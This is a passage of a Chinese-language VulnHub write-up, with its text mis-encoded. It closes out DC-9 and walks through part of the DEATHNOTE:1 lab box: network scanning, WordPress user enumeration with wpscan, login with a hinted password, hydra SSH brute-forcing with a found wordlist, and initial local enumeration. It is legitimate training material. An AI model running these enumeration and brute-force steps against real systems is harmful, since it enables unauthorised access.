â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line">â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—    â•šâ–ˆâ–ˆâ–ˆâ•”â–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—</span><br><span class="line">â•šâ•â•  â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â•â•šâ•â•â•â•â•â•â•     â•šâ•â•â•â•šâ•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•šâ•â•</span><br><span class="line"><span class="code">                                                                             </span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations - you have done well to get to this point.</code></p>
<p><code>Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those</code><br><code>who have taken the time to complete the various DC challenges.</code></p>
<p><code>I also want to send out a big thank you to the various members of @m0tl3ycr3w .</code></p>
<p><code>They are an inspirational bunch of fellows.</code></p>
<p><code>Sure, they might smell a bit, but...just kidding.  :-)</code></p>
<p><code>Sadly, all things must come to an end, and this will be the last ever</code><br><code>challenge in the DC series.</code></p>
<p><code>So long, and thanks for all the fish.</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æ­å–œ - ä½ å·²ç»å®Œæˆäº†è¿™ä¸€ç‚¹ã€‚</p>
<p>å¸Œæœ›ä½ å–œæ¬¢ DC-9ã€‚åªæ˜¯æƒ³å¯¹æ‰€æœ‰è¿™äº›äººè¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢<br>ä»–ä»¬èŠ±æ—¶é—´å®Œæˆäº†å„ç§ DC æŒ‘æˆ˜ã€‚</p>
<p>æˆ‘è¿˜è¦å‘@m0tl3ycr3w çš„å„ä¸ªæˆå‘˜è¡¨ç¤ºè¡·å¿ƒçš„æ„Ÿè°¢ã€‚</p>
<p>ä»–ä»¬æ˜¯ä¸€ç¾¤é¼“èˆäººå¿ƒçš„äººã€‚</p>
<p>å½“ç„¶ï¼Œå®ƒä»¬å¯èƒ½ä¼šé—»åˆ°ä¸€ç‚¹å‘³é“ï¼Œä½†æ˜¯â€¦â€¦å¼€ç©ç¬‘ã€‚ :-)</p>
<p>å¯æ‚²çš„æ˜¯ï¼Œä¸€åˆ‡éƒ½å¿…é¡»ç»“æŸï¼Œè¿™å°†æ˜¯æœ€åä¸€æ¬¡<br>DCç³»åˆ—ä¸­çš„æŒ‘æˆ˜ã€‚</p>
<p>è¿™ä¹ˆä¹…ï¼Œæ„Ÿè°¢æ‰€æœ‰çš„é±¼ã€‚</p>
</blockquote>
<p><strong>ä¸€ä¸ªæ——å­æ‰¾å®Œï¼Œæ¸¸æˆç»“æŸ</strong></p>
<p>ã€dcç³»åˆ—ç»“æŸï¼Œé˜…è¯»åˆ°æœ¬æ–‡çš„æœ‹å‹ï¼Œå¸Œæœ›å¯¹ä½ ä»¬æœ‰æ‰€å¸®åŠ©ã€‘</p>
<hr>
<h1 id="ELSE"><a href="#ELSE" class="headerlink" title="ELSE"></a>ELSE</h1><h1 id="ä¸€ã€DEATHNOTE-1-åˆçº§"><a href="#ä¸€ã€DEATHNOTE-1-åˆçº§" class="headerlink" title="ä¸€ã€DEATHNOTE: 1[åˆçº§]"></a>ä¸€ã€DEATHNOTE: 1[åˆçº§]</h1><p>åŸºæ‹‰å¥½å¸…ï¼Œå¿…é¡»æ‹¿è¿™ä¸ªå¼€å¤´ï¼Œç›´æ¥ææƒè¿›ä»–çš„å¿ƒã€ä¸æ˜¯å—é€šã€‘</p>
<p><img src="/post/vulnhub/image-20221106151711523.png" alt="image-20221106151711523"></p>
<blockquote>
<p>hint:<br>ä¸è¦æµªè´¹å¤ªå¤šæ—¶é—´è·³å‡ºæ¡†æ¡†æ€è€ƒã€‚è¿™æ˜¯ä¸€ä¸ªç›´æˆªäº†å½“çš„ç›’å­ã€‚</p>
</blockquote>
<hr>
<p>æ‰¾è¿™ä¸ªé¶åœº<code>ip</code>ï¼Œå°±æŠŠæˆ‘å¡ä½äº†ï¼Œåé¢çœ‹åˆ°å¥½åƒè¿™ä¸ªé¶æœºå’Œ<code>vm</code>ä¸å…¼å®¹ï¼Œåªèƒ½ç”¨<code>vitrualbox</code></p>
<p>åé¢ä¸‹äº†ä¸ª<code>vitrualbox</code>æ‰æ‰¾åˆ°é¶æœº<code>ip</code></p>
<p><img src="/post/vulnhub/image-20221108134734459.png" alt="image-20221108134734459"></p>
<p>ç„¶å<code>vm</code>ä¹Ÿæ¡¥æ¥ï¼Œå°±æ‰¾åˆ°äº†</p>
<p><img src="/post/vulnhub/image-20221108190437827.png" alt="image-20221108190437827"></p>
<p>é¡ºå¸¦è¡¥å……ä¸¤ä¸ªæ‰«æå·¥å…·ã€ä½¿ç”¨è‡ªè¡Œ<code>-h</code>æŸ¥çœ‹ã€‘ã€æ„Ÿè§‰å’Œ<code>nmap</code>å·®ä¸å¤šã€‘</p>
<blockquote>
<p><code>arp-scan</code>æ˜¯Kali Linuxè‡ªå¸¦çš„ä¸€æ¬¾ARPæ‰«æå·¥å…·ã€‚è¯¥å·¥å…·å¯ä»¥è¿›è¡Œå•ä¸€ç›®æ ‡æ‰«æï¼Œä¹Ÿå¯ä»¥è¿›è¡Œæ‰¹é‡æ‰«æã€‚æ‰¹é‡æ‰«æçš„æ—¶å€™ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡CIDR<br>åœ°å€èŒƒå›´æˆ–è€…åˆ—è¡¨æ–‡ä»¶çš„æ–¹å¼æŒ‡å®šã€‚è¯¥å·¥å…·å…è®¸ç”¨æˆ·å®šåˆ¶ARPåŒ…ï¼Œæ„å»ºéæ ‡å‡†æ•°æ®åŒ…ã€‚åŒæ—¶ï¼Œ<code>è¯¥å·¥å…·ä¼šè‡ªåŠ¨è§£æMacåœ°å€ï¼Œç»™å‡ºMACå¯¹åº”çš„ç¡¬</code><br><code>ä»¶å‚å•†ï¼Œå¸®åŠ©ç”¨æˆ·ç¡®è®¤ç›®æ ‡ã€‚</code></p>
<p><code>netdiscover</code><br>Netdiscoveræ˜¯ä¸€ç§ç½‘ç»œæ‰«æå·¥å…·ï¼Œé€šè¿‡ARPæ‰«æå‘ç°æ´»åŠ¨ä¸»æœºï¼Œå¯ä»¥é€šè¿‡ä¸»åŠ¨å’Œè¢«åŠ¨ä¸¤ç§æ¨¡å¼è¿›è¡ŒARPæ‰«æã€‚é€šè¿‡ä¸»åŠ¨å‘é€ARPè¯·æ±‚æ£€æŸ¥ç½‘ç»œARPæµé‡ï¼Œé€šè¿‡è‡ªåŠ¨æ‰«ææ¨¡å¼æ‰«æç½‘ç»œåœ°å€ã€‚æœ¬æ–‡ä»‹ç»Netdiscoverçš„å®‰è£…å’Œä½¿ç”¨æ–¹æ³•ã€‚</p>
</blockquote>
<hr>
<h2 id="ä¿¡æ¯æ”¶é›†-9"><a href="#ä¿¡æ¯æ”¶é›†-9" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><p>ä¹ æƒ¯<code>nmap</code>æ‰«ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221108191059284.png" alt="image-20221108191059284"></p>
<blockquote>
<p><code>22</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œ<code>ssh</code><br><code>80</code>ç«¯å£å¼€æ”¾ï¼Œè¿è¡Œ<code>http</code></p>
</blockquote>
<p>ç„¶åè®¿é—®é¶æœº<code>ip</code></p>
<p><img src="/post/vulnhub/image-20221108192408036.png" alt="image-20221108192408036"></p>
<p>çœ‹åˆ°é¡µé¢æ˜¾ç¤º<code>please wait.....</code></p>
<p><img src="/post/vulnhub/image-20221108192756267.png" alt="image-20221108192756267"></p>
<p>ç„¶åæ˜¾ç¤ºè¿æ¥å¤±è´¥</p>
<p>çœ‹æ¥æ˜¯éœ€è¦ä¿®æ”¹<code>/etc/hosts</code>æ–‡ä»¶ï¼Œæ·»åŠ é¶æœºåŸŸåå’Œ<code>ip</code></p>
<p><img src="/post/vulnhub/image-20221108193016082.png" alt="image-20221108193016082"></p>
<p>å†æ¬¡è®¿é—®é¶æœº<code>ip</code></p>
<p><img src="/post/vulnhub/image-20221108193044669.png" alt="image-20221108193044669"></p>
<p>è®¿é—®æˆåŠŸ</p>
<p>æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹ç½‘ç«™çš„æ¡†æ¶</p>
<p><img src="/post/vulnhub/image-20221108200530705.png" alt="image-20221108200530705"></p>
<blockquote>
<p><code>CMS</code>ä¸º<code>wordpress 5.8</code>ï¼Œå¾ˆè€çš„ç‰ˆæœ¬äº†ï¼Œè¿™é‡Œè‚¯å®šæœ‰ææƒçš„æ–¹å¼</p>
<p>é‡‡ç”¨è„šæœ¬ä¸º<code>Twiiter Emoji</code>ï¼Œè¿™æ˜¯æ¨ç‰¹çš„å¼€æºåº“é‡Œçš„å¼•ç”¨è¡¨æƒ…çš„è„šæœ¬ï¼Œä¸æ˜¯å…³é”®</p>
</blockquote>
<p>æˆ‘ä»¬çœ‹åˆ°é¡µé¢æœ‰<code>hint</code></p>
<p><img src="/post/vulnhub/image-20221108193350489.png" alt="image-20221108193350489"></p>
<blockquote>
<p><code>Find a notes.txt file on server or SEE the L comment</code> </p>
<p>æ„æ€æ˜¯ï¼š</p>
<p>æ‰¾åˆ°ä¸€ä¸ªnotes.txt æ–‡ä»¶æœåŠ¡å™¨ä¸Š<br>æˆ–</p>
<p>çœ‹çœ‹Lçš„è¯„è®º </p>
<p>é‚£æˆ‘ä»¬å°±å¯ä»¥ç”¨dirsearchæ‰«ä¸€ä¸‹ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°notes.txtæ–‡ä»¶åœ¨å“ªé‡Œï¼Œä»¥åŠè¯„è®ºç½‘é¡µåœ¨å“ªé‡Œ</p>
</blockquote>
<p>è¯„è®ºé¡µé¢æˆ‘æ˜¯åœ¨é¦–é¡µé¢ä¸­é—´</p>
<blockquote>
<p><code>i will eliminate you L!</code></p>
</blockquote>
<p>é“¾æ¥è·³è½¬æ‰¾åˆ°çš„ï¼Œä½†å¥½åƒæ²¡å•¥ä¿¡æ¯ï¼Œä¼¼ä¹çœ‹ä¸åˆ°<code>L</code>çš„è¯„è®º</p>
<p><img src="/post/vulnhub/image-20221108204306618.png" alt="image-20221108204306618"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/i</span>ndex.php<span class="regexp">/2021/</span><span class="number">07</span><span class="regexp">/19/</span>kira/</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108204334859.png" alt="image-20221108204334859"></p>
<p>å·¦ä¸‹è§’çš„</p>
<blockquote>
<p><code>my fav line is iamjustic3</code></p>
<p><code>L on i will eliminate you L!</code></p>
<p>æˆ‘æœ€å–œæ¬¢çš„å°è¯æ˜¯<code>iamjustic3</code><br><code>L</code> åœ¨ ï¼Œæˆ‘ä¼šæ¶ˆç­ä½ L! </p>
<p><code>iamjustic3</code>ï¼šåˆ†å¼€çœ‹i am justic 3ã€æˆ‘æ˜¯æ­£ä¹‰çš„3ã€‘ï¼Œä½†å¥½åƒå®é™…æ„æ€ï¼Œåé¢çœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨çš„</p>
<p><code>eliminate</code>ï¼šæ¶ˆç­ï¼Œçº¯ç²¹å•è¯æ„æ€ï¼Œæ²¡å•¥æ„ä¹‰</p>
</blockquote>
<p>æˆ‘ä»¬å…ˆç”¨<code>dirsearch</code>æ‰«ä¸€ä¸‹æ‰¾ä¸€ä¸‹ä¿¡æ¯</p>
<p><img src="/post/vulnhub/image-20221108200416113.png" alt="image-20221108200416113"></p>
<h3 id="å…³é”®ä¿¡æ¯"><a href="#å…³é”®ä¿¡æ¯" class="headerlink" title="*å…³é”®ä¿¡æ¯"></a>*å…³é”®ä¿¡æ¯</h3><p>å…³é”®ç™»å½•é¡µé¢å’Œ<code>robots.txt</code>ã€å…¶ä»–é¡µé¢æ²¡æœ‰å•¥ä¿¡æ¯ã€‘</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-login.php</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108201422820.png" alt="image-20221108201422820"></p>
<p>çˆ¬è™«æ–‡æœ¬</p>
<p><img src="/post/vulnhub/image-20221108201357084.png" alt="image-20221108201357084"></p>
<blockquote>
<p><code>fuck it my dad</code><br><code>added hint on /important.jpg</code></p>
<p><code>ryuk please delete it</code><br>æ„æ€æ˜¯ï¼š<br>xæˆ‘çš„çˆ¸çˆ¸<br>ä»–æŠŠæš—ç¤ºè—åœ¨äº†<code>/important.jpg</code>é‡Œ</p>
<p>ryukï¼Œè¯·åˆ äº†å®ƒ</p>
<p>ryukæ˜¯åŸºæ‹‰çš„æ­»ç¥ï¼ŒåŸºæ‹‰è®©ä»–åˆ é™¤å›¾ç‰‡ï¼ŒåŒæ—¶å›¾ç‰‡ä¹Ÿè—æœ‰ä¿¡æ¯<br>è™½ç„¶æˆ‘ä»¬æ‰¾åˆ°äº†ç™»å½•é¡µé¢ï¼Œä»¥åŠç”¨æˆ·åï¼Œä½†æ˜¯è¿˜æ˜¯ä¸çŸ¥é“å¯†ç <br>æ‰€ä»¥è¿˜è¦æ‰¾å¯†ç </p>
</blockquote>
<p>æˆ‘ä»¬å…ˆè¯•è¯•æˆ‘ä»¬èƒ½ä¸èƒ½æŸ¥çœ‹<code>/important.jpg</code></p>
<p><img src="/post/vulnhub/image-20221108210813828.png" alt="image-20221108210813828"></p>
<p>å‘ç°å›¾ç‰‡æ— æ³•æ˜¾ç¤º</p>
<p>çœ‹æ¥å›¾ç‰‡æ ¼å¼æœ‰é—®é¢˜ï¼Œåº”è¯¥æ˜¯æ’å…¥äº†æ–‡æœ¬ä»€ä¹ˆçš„</p>
<p>æˆ‘ä»¬ç”¨<code>curl</code></p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">curl http:<span class="comment">//deathnote.vuln/important.jpg</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<p><img src="/post/vulnhub/image-20221108220741696.png" alt="image-20221108220741696"></p>
<blockquote>
<p><code>i am Soichiro Yagami, light&#39;s father</code><br><code>i have a doubt if L is true about the assumption that light is kira</code></p>
<p><code>i can only help you by giving something important</code></p>
<p><code>login username : user.txt</code><br><code>i don&#39;t know the password.</code><br><code>find it by yourself</code><br><code>but i think it is in the hint section of site</code></p>
<p>æ„æ€æ˜¯ï¼š<br>æˆ‘æ˜¯å…‰çš„çˆ¶äº² å…«ç¥å®—ä¸€éƒ<br>æˆ‘æ€€ç–‘ L å…³äºå…‰æ˜¯ kira çš„å‡è®¾æ˜¯å¦æ­£ç¡®</p>
<p>æˆ‘åªèƒ½é€šè¿‡æä¾›ä¸€äº›é‡è¦çš„ä¸œè¥¿æ¥å¸®åŠ©ä½ </p>
<p>ç™»å½•ç”¨æˆ·åï¼š<code>user.txt</code><br>æˆ‘ä¸çŸ¥é“å¯†ç ã€‚<br>è‡ªå·±æ‰¾<br>ä½†æˆ‘è®¤ä¸ºå®ƒåœ¨ç½‘ç«™çš„æç¤ºéƒ¨åˆ†<br>#<code>user.txt</code>çœ‹æ¥éœ€è¦åŒæ ·è®¿é—®æ‰¾ä¸€ä¸‹<br>#æç¤ºéƒ¨åˆ†æœ‰å¯†ç ï¼Œçœ‹æ¥å°±æ˜¯<code>notes.txt</code>æ–‡æœ¬é‡Œäº†</p>
</blockquote>
<p>é‚£åé¢å°±æ˜¯æ‰¾ä¸€ä¸‹è¿™ä¸¤ä¸ªæ–‡æœ¬æ–‡ä»¶åœ¨å“ªé‡Œäº†</p>
<h2 id="1-wpscan"><a href="#1-wpscan" class="headerlink" title="1.wpscan"></a>1.wpscan</h2><p>æ—¢ç„¶ä¿¡æ¯ä¸å¤Ÿï¼Œé‚£æˆ‘ä»¬å°±ç”¨å¯¹åº”çš„<code>CMS</code>å·¥å…·ã€<code>wpscan</code>ã€‘æ‰«ä¸€ä¸‹çœ‹çœ‹æœ‰æ²¡æœ‰ä¿¡æ¯</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">wpscan <span class="params">--url</span> http:<span class="string">//deathnote.vuln/wordpress</span> -e u</span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108204728050.png" alt="image-20221108204728050"></p>
<p>å‘ç°<code>kira</code>æ‰æ˜¯çœŸæ­£çš„åå°ç”¨æˆ·ï¼Œé‚£ä¹ˆ<code>ryuk</code>å¯èƒ½å°±æ˜¯<code>ssh</code>çš„ç™»å½•ç”¨æˆ·ï¼Œé‚£ä»–çš„å¯†ç æ˜¯å¤šå°‘å‘¢</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘æƒ³èµ·ä»–çš„ç•™è¨€</p>
<blockquote>
<p>my fav line is <code>iamjustic3</code></p>
<p>L on i will eliminate you L!</p>
</blockquote>
<p>ä»–è¯´ä»–æœ€å–œæ¬¢çš„å°è¯æ˜¯<code>iamjustic3</code></p>
<p>æ—¢ç„¶æ˜¯æœ€å–œæ¬¢çš„ï¼Œé‚£æœ€æœ‰å¯èƒ½æ‹¿æ¥å½“å¯†ç ã€‚æ‰€ä»¥è¿™ä¸ªå¯èƒ½å°±æ˜¯<code>kira</code>çš„åå°ç½‘ç«™çš„ç™»é™†å¯†ç </p>
<h3 id="ç™»å½•åå°"><a href="#ç™»å½•åå°" class="headerlink" title="ç™»å½•åå°"></a>ç™»å½•åå°</h3><blockquote>
<p><code>kira</code><br><code>iamjustic3</code></p>
</blockquote>
<p><img src="/post/vulnhub/image-20221108205228054.png" alt="image-20221108205228054"></p>
<p>ç™»å½•æˆåŠŸ</p>
<p>è¿™ä¸ªé¡µé¢æé†’éœ€è¦ç®¡ç†å‘˜é‚®ç®±éªŒè¯ï¼Œç›´æ¥<code>remind me later</code>ï¼Œæˆ‘ä»¬å…ˆåˆ°åå°çœ‹çœ‹</p>
<p>è¿›æ¥åå°å‘ç°<code>comments</code>é¡µé¢ï¼Œå…ˆçœ‹çœ‹èƒ½ä¸èƒ½çœ‹åˆ°<code>L</code>çš„è¯„è®º</p>
<p><img src="/post/vulnhub/image-20221108205526638.png" alt="image-20221108205526638"></p>
<p>å‘ç°åŒæ ·å•¥ä¹Ÿæ²¡æœ‰</p>
<h2 id="2-sshç™»å½•-1"><a href="#2-sshç™»å½•-1" class="headerlink" title="2.sshç™»å½•"></a>2.sshç™»å½•</h2><p>æˆ‘ä»¬å†çœ‹çœ‹å…¶ä»–é¡µé¢</p>
<p>åœ¨<code>Media</code>é¡µé¢</p>
<p><img src="/post/vulnhub/image-20221108211543340.png" alt="image-20221108211543340"></p>
<p>æˆ‘ä»¬å‘ç°äº†<code>notes.txt</code></p>
<p><img src="/post/vulnhub/image-20221108211618643.png" alt="image-20221108211618643"></p>
<p>ç‚¹å¼€å¾—åˆ°<code>notes.txt</code>æ–‡æœ¬çš„ä½ç½®</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-content<span class="regexp">/uploads/</span><span class="number">2021</span><span class="regexp">/07/</span>notes.txt</span><br></pre></td></tr></table></figure>

<p>è®¿é—®å¾—åˆ°</p>
<p><img src="/post/vulnhub/image-20221108211705028.png" alt="image-20221108211705028"></p>
<p>çœ‹èµ·æ¥å¾ˆåƒå¯†ç æœ¬</p>
<blockquote>
<p><code>death4</code><br><code>death4life</code><br><code>death4u</code><br><code>death4ever</code><br><code>death4all</code><br><code>death420</code><br><code>death45</code><br><code>death4love</code><br><code>death49</code><br><code>death48</code><br><code>death456</code><br><code>death4014</code><br><code>1death4u</code><br><code>yaydeath44</code><br><code>thedeath4u2</code><br><code>thedeath4u</code><br><code>stickdeath420</code><br><code>reddeath44</code><br><code>megadeath44</code><br><code>megadeath4</code><br><code>killdeath405</code><br><code>hot2death4sho</code><br><code>death4south</code><br><code>death4now</code><br><code>death4l0ve</code><br><code>death4free</code><br><code>death4elmo</code><br><code>death4blood</code><br><code>death499Eyes301</code><br><code>death498</code><br><code>death4859</code><br><code>death47</code><br><code>death4545</code><br><code>death445</code><br><code>death444</code><br><code>death4387n</code><br><code>death4332387</code><br><code>death42521439</code><br><code>death42</code><br><code>death4138</code><br><code>death411</code><br><code>death405</code><br><code>death4me</code></p>
</blockquote>
<p>æˆ‘ä»¬è¯•è¯•çˆ†ç ´<code>ssh</code></p>
<p>æˆ‘ä»¬å†å¼„ä¸ªç”¨æˆ·åæœ¬</p>
<blockquote>
<p>å°±æ‹¿æˆ‘ä»¬å·²çŸ¥çš„ä¸‰ä¸ªç”¨æˆ·ï¼Œåšæˆç”¨æˆ·åæœ¬<br><code>kira</code><br><code>l</code><br><code>ryku</code></p>
</blockquote>
<p>ç„¶åä¹å¤´è›‡çˆ†ç ´ç™»å½•<code>ssh</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L un.txt -P pass.txt <span class="number">192.168.163.123</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108213915226.png" alt="image-20221108213915226"></p>
<p>å‘ç°ç™»å½•ç”¨æˆ·ã€çœ‹æ¥ç”¨ä¸ä¸Šå»æ‰¾é‚£ä¸ª<code>user.txt</code>ã€‘</p>
<blockquote>
<p><code>l</code><br><code>death4me</code></p>
</blockquote>
<p>ç„¶åæˆ‘ä»¬è¯•è¯•ç™»å½•</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> l@<span class="number">192.168.16.123</span> </span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108214049547.png" alt="image-20221108214049547"></p>
<p>ç™»å½•æˆåŠŸï¼Œå¹¶çœ‹åˆ°å½“å‰ç›®å½•ä¸‹æœ‰ä¸ªæ–‡æœ¬æ–‡ä»¶<code>user.txt</code>ã€æ— å¥ˆï¼Œç°åœ¨æ‰¾åˆ°åº”è¯¥ä¹Ÿæ²¡å•¥ç”¨äº†ã€‘</p>
<p>æŸ¥çœ‹ä¸€ä¸‹</p>
<p><img src="/post/vulnhub/image-20221108214257074.png" alt="image-20221108214257074"></p>
<p>å‘ç°æ˜¯ä¸²çœ‹ä¸æ‡‚çš„æ–‡æœ¬</p>
<p>æˆ‘ä»¬è¯•è¯•<code>ciphey</code>è§£å¯†ä¸€ä¸‹</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">ciphey</span> <span class="literal">-</span><span class="comment">t &quot;</span><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">--------------</span><span class="string">.</span><span class="literal">++++++++</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++++++</span><span class="string">.</span><span class="literal">-----------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span><span class="literal">+++++++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">++++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span>&gt;&gt;<span class="literal">----------</span><span class="string">.</span><span class="literal">+++++++++++++++++++</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++</span><span class="string">.</span><span class="literal">----------</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">++++++++++</span><span class="string">.</span><span class="literal">-------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++++++</span><span class="string">.</span><span class="literal">-----</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">+++++++++++++</span><span class="string">.</span>&gt;&gt;<span class="literal">++++++</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++++++++</span><span class="string">.</span><span class="literal">-----------------</span><span class="string">.</span></span><br><span class="line"><span class="comment">&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°</p>
<p><img src="/post/vulnhub/image-20221108221734407.png" alt="image-20221108221734407"></p>
<blockquote>
<p><code>i think u got the shell , but you wont be able to kill me -kira</code><br>æ„æ€æ˜¯ï¼š<br>æˆ‘æƒ³ä½ å·²ç»æ‹¿åˆ°shelläº†ï¼Œä½†ä½ æ€ä¸äº†æˆ‘-åŸºæ‹‰</p>
</blockquote>
<p>æ„Ÿè§‰ä¿¡æ¯æ²¡å•¥ç”¨ï¼Œä½†æ˜¯å¤§æ¦‚çŒœæµ‹ï¼Œæ€æ­»åŸºæ‹‰æ˜¯éœ€è¦ææƒçš„ï¼Œä½†æ˜¯ä»Lè¿™é‡Œæ˜¯æ— æ³•ææƒï¼Œåªæœ‰åŸºæ‹‰æ‰å¯ä»¥ææƒ</p>
<p>æˆ‘ä»¬å¯ä»¥è¯•è¯•æˆ‘ä»¬èƒ½å¦ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä¸€äº›å‘½ä»¤</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/vulnhub/image-20221108222201419.png" alt="image-20221108222201419"></p>
<p> è¿™æ ·çœ‹æ¥<code>L</code>æ˜¯æ— æ³•ä»¥ç®¡ç†å‘˜èº«ä»½æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼Œé‚£å°±åªæœ‰çœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–è·¯å¾„äº†</p>
<p>æˆ‘ä»¬å†è¾“å…¥</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>çœ‹çœ‹æˆ‘ä»¬å½“å‰è·¯å¾„</p>
<p><img src="/post/vulnhub/image-20221108214344792.png" alt="image-20221108214344792"></p>
<p>å‘ç°æˆ‘ä»¬è¿˜æœ‰ä¸ªä¸Šçº§ç›®å½•ï¼Œè¿”å›æŸ¥çœ‹å…¶ä¸‹ç›®å½•</p>
<p>å±…ç„¶è¿˜æœ‰ä¸ª<code>kira</code>çš„ç›®å½•</p>
<p>æˆ‘ä»¬çœ‹çœ‹æœ‰ä»€ä¹ˆ</p>
<p><img src="/post/vulnhub/image-20221108214506480.png" alt="image-20221108214506480"></p>
<p><img src="/post/vulnhub/image-20221108214544456.png" alt="image-20221108214544456"></p>
<p>å‘ç°å…¶ç›®å½•ä¸‹çš„<code>kira.txt</code>è®¾ç½®äº†æƒé™</p>
<p>æˆ‘ä»¬å°è¯•ç”¨ä¹‹å‰åå°ç™»å½•çš„å¯†ç ç™»å½•ï¼Œä¹Ÿå¤±è´¥äº†</p>
